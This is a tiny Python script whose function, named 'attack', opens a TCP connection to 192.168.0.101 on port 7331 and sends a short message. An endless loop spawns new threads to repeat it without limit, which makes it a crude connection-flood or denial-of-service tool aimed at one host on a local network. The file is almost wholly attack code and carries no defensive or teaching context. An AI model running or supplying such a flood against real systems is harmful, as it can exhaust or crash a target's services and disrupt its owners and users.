import socket
import threading as th

def attack():
	q = socket.socket()
	q.connect(('192.168.0.101', 7331))
	q.send(b'hello')
	
while True:
	th.Thread(target=attack).start()